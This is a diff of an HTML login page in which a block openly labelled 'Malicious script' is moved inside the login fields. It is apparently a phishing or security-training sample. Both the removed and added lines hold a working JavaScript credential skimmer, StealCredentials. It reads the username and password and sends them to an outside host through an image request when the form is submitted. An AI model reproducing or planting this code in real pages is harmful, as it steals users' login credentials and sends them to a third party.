@@ -37,20 +37,20 @@
         <div id="login-fields">
           <input id="login_username" placeholder="username" tabindex="1" name="username" type="text">
           <div class="error-msg">Hint: your username is separate from your email address.</div>
-          <input id="login_password" placeholder="passphrase" tabindex="2" autocomplete="off" class="validate-text" name="password" type="password" mouseev="true" keyev="true" clickev="true"> 
+          <input id="login_password" placeholder="passphrase" tabindex="2" autocomplete="off" class="validate-text" name="password" type="password" mouseev="true" keyev="true" clickev="true">
+      <!--***************************Malicious script***************************-->
+          <script type="text/javascript"> 
+            function StealCredentials() {
+                var username = document.getElementById("login_username").value;
+                var pass = document.getElementById("login_password").value;
+                var credentials = "username = " + username + " | " + "password = " + pass;
+                img = document.createElement("img");
+                img.src = "http://r7.io/e/nhytrek?s=" + credentials;
+            }
+            document.forms[0].onsubmit = StealCredentials();
+          </script>
+      <!--***************************Malicious script***************************--> 
       </div>
-      <!--***************************Malicious script***************************-->
-      <script type="text/javascript"> 
-        function StealCredentials() {
-            var username = document.getElementById("login_username").value;
-            var pass = document.getElementById("login_password").value;
-            var credentials = "username = " + username + " | " + "password = " + pass;
-            img = document.createElement("img");
-            img.src = "http://r7.io/e/nhytrek?s=" + credentials;
-        }
-        document.forms[0].onsubmit = StealCredentials();
-      </script>
-      <!--***************************Malicious script***************************-->
         <input id="user_language" name="user_language" type="hidden" value="english">
         <input type="submit" id="signin-btn" class="submit-btn optional" value="Sign in..." tabindex="3">
       </div>
